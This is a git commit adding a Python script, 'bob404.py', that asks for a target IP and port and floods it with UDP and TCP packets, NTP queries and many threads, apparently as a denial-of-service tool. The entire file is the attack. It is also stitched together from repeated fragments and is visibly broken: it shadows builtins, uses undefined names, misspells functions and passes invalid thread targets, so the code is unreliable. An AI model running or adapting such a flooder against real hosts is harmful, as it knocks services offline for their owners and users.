f4d9f5ff7d682304bc13c03201409ab8c495987d
Bobozindapest <149890429+Bobozindapest@users.noreply.github.com>
2023-12-03 12:26:15 -1100

    Add files via upload

---
+++ bob404.py
@@ -0,0 +1,229 @@
+#!/usr/bin/env python3
+import socket
+import threading
+import os
+import time
+import pyfiglet
+import os
+os.system("clear")
+os.system("pyfiglet --color=RED BObC1")
+import socket, threading
+IP = input("\033[31mIP: ")
+PORT = int(input("\033[31mPORTA: "))
+print("\033[32mcarregando...")
+time.sleep(1.3)
+print("\033[34mAtacando ip\033[32m", IP, "\033[34me porta\033[32m", PORT)
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+import socket, threading
+data = bytes.fromhex("AA AA AA AA")
+bytes2 = bytes.fromhex("AA AA AA AA")
+bytes = bytes.fromhex("AA AA AA AA")
+data2 = bytes.fromhex("AA AA AA AA")
+bytes3 = bytes.fromhex("AA AA AA AA")
+bytes5 = bytes.fromhex("AA AA AA AA")
+data5 = bytes.fromhex("AA AA AA AA")
+bytes8 = bytes.fromhex("AA AA AA AA")
+bytesc = bytes.fromhex("AA AA AA AA")
+data0 = bytes.fromhex("AA AA AA AA")
+bytes9 = bytes.fromhex("AA AA AA AA")
+bytesv = bytes.fromhex("AA AA AA AA")
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect((IP,PORT))
+for i in range(0, 9999999999999):
+    s.send(data)
+    s.send(bytes)
+    s.send(bytes2)
+    s.send(data2)
+    s.send(bytes3)
+    s.send(bytes5)
+    s.send(data5)
+    s.send(bytes8)
+    s.send(bytesc)
+    s.send(data0)
+    s.send(bytes9)
+    s.send(bytesv)
+s.close()
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+#!/usr/bin/env python3
+import socket, threading, random
+def run():
+	bytes2 = bytes.fromhex("AA AA AA AA")
+	data = bytes.fromhex("AA AA AA AA")
+	bytes = bytes.fromhex("AA AA AA AA")
+	bytes3 = bytes.fromhex("AA AA AA AA")
+	bytes5 = bytes.fromhex("AA AA AA AA")
+	bytes8 = bytes.fromhex("AA AA AA AA")
+	bytesc = bytes.fromhex("AA AA AA AA")
+	data0 = bytes.fromhex("AA AA AA AA")
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for i in range(999999999999999999999999999999999999):
+				s.send(data)
+				s.send(bytes)
+				s.send(bytes2)
+				s.send(addr)
+				s.send(bytes3)
+				s.send(bytes5)
+				s.send(bytes8)
+				s.send(data0)
+				s.send(bytesc)
+			print("")
+		except:
+			print("")
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+#!/usr/bin/env python3
+import socket, threading, random
+def run2():
+	bytes2 = bytes.fromhex("AA AA AA AA")
+	data = bytes.fromhex("AA AA AA AA")
+	bytes = bytes.fromhex("AA AA AA AA")
+	data2 = bytes.fromhex("AA AA AA AA")
+	bytes3 = bytes.fromhex("AA AA AA AA")
+	data5 = bytes.fromhex("AA AA AA AA")
+	bytes8 = bytes.fromhex("AA AA AA AA")
+	data0 = bytes.fromhex("AA AA AA AA")
+	bytesc = bytes.fromhex("AA AA AA AA")
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			addr = (str(IP),int(PORT))
+			for i in range(999999999999999999999999999999999999999999999999999999999999999):
+				s.send(data)
+				s.send(addr)
+				s.send(bytes)
+				s.send(bytes2)
+				s.send(data2)
+				s.send(bytes3)
+				s.send(data5)
+				s.send(bytes8)
+				s.send(data0)
+				s.send(bytesc)
+			print("")
+		except:
+			s.close()
+			print("")
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+import socket, threading
+n = 0
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def ataque():
+    global n, s
+    while True:
+        s.sendto(bytes(str(n),'utf-8'),(IP, PORT))
+        n+=1
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+import socket, threading
+bytes2 = bytes.fromhex("AA AA AA AA")
+data = bytes.fromhex("AA AA AA AA")
+bytes = bytes.fromhex("AA AA AA AA")
+data2 = bytes.fromhex("AA AA AA AA")
+bytes3 = bytes.fromhex("AA AA AA AA")
+bytes5 = bytes.fromhex("AA AA AA AA")
+bytes2 = bytes.fromhex("AA AA AA AA")
+data0 = bytes.fromhex("AA AA AA AA")
+bytes9 = bytes.fromhex("AA AA AA AA")
+datac = bytes.fromhex("AA AA AA AA")
+bytesv = bytes.fromhex("AA AA AA AA")
+bytese = bytes.fromhex("AA AA AA AA")
+udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+udp_socket.send(data)
+udp_socket.send(bytes)
+udp_sockets.send(bytes2)
+udp_sockets.send(data2)
+udp_sockets.send(bytes3)
+udp_sockets.send(bytes5)
+udp_sockets.send(bytes2)
+udp_sockets.send(bytes5)
+udp_sockets.send(data0)
+udp_sockets.send(bytes9)
+udp_sockets.send(datac)
+udp_sockets.send(bytesv)
+udp_sockets.send(bytese)
+udp_socket.sendto(b"UDP UDP UDP", (IP, PORT))
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+import socket, threading, time, sys
+def news():
+    try:
+        bytes = bytes.fromhex("AA AA AA AA")
+        bytes2 = bytes.fromhex("AA AA AA AA")
+        bytes3 = bytes.fromhex("AA AA AA AA")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < Timeout:
+            PORT = random.randit(22,55500)
+            sock.sendto(bytes3*bytes2*bytes*random.randint(5,22),(IP, PORT))
+    except:
+        print("")
+import random
+def randomip():
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
+import socket, time
+ntp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ntp_query = b"\x1b" + b"\x00" * 47
+ntp_socket.sendto(ntp_query, (IP, PORT))
+ntp_response, _ = ntp_socket.recvfrom(1024)
+print("NTP response:", ntp_response)
+ntp_socket.close()
+import threading
+threading.Thread(target=ataque, args=()).start()
+for i in range(15):
+	th = threading.Thread(target = run)
+	th.start()
+	th = threading.Thread(target = run2)
+	th.start()
+import threading
+for i in range(15):
+        th1 = threading.Thread(target=bytese)
+        th1.start()
+        th2 = threading.Thread(target=bytesv)
+        th2.start()
+        th3 = threading.Thread(target=datac)
+        th3.start()
+        th4 = threading.Thread(target=news)
+        th4.start()
+        th5 = threading.Thread(target=randomip)
+        th5.start()
+        th6 = threading.Thread(target=data0)
+        th6.start()
+        th7 = threading.Thread(target=bytes5)
+        th7.start()
+        th8 = threading.Thread(target=data2)
+        th8.start()
+        th9 = threading.Thread(target=bytes_)
+        th9.start()
+        th10 = threading.Thread(target=bytes3)
+        th10.start()
+        th11 = threading.Thread(target=bytesc)
+        th11.start()
+def new():
+	threading.Thread(target = run)
+	th.start()
+	threading.Thread(target = run2)
+	th.start()
+	threading.Thread(target = news)
+	th.start()
+	threading.Thread(target = randomip)
+	th.start()
+	threading.Thread(target=ataque, args=()).start()
+threading.Thread(target = new)
+th.start()
